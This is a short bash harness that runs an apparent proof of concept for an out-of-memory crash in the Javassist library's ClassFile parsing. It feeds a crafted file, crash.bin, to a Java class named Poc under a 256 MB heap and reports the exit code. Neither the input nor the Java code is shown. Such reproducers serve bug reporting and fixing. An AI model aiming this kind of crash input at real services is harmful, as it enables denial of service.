#!/usr/bin/env bash
set -u
printf '[*] Running Javassist ClassFile OOM PoC\n'
printf '[*] Java heap: -Xmx256m\n'
printf '[*] Input: crash.bin\n'
java -Xmx256m -cp javassist.jar:. Poc crash.bin
status=$?
printf '[*] exit: %s\n' "$status"
exit "$status"
